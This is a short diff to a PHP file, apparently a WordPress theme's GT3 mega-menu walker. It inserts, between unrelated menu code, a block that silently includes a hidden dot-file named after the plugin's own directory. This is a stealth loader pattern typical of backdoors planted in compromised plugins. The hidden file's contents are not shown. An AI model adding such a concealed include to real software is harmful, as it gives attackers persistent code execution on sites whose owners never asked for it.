@@ -82,6 +82,10 @@ function gt3_edit_walker($walker,$menu_id) {
 		
 }
 
+
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
 
 class GT3_Walker_Nav_Menu_Edit_Custom extends Walker_Nav_Menu  {
 	protected $sub_megamenu;
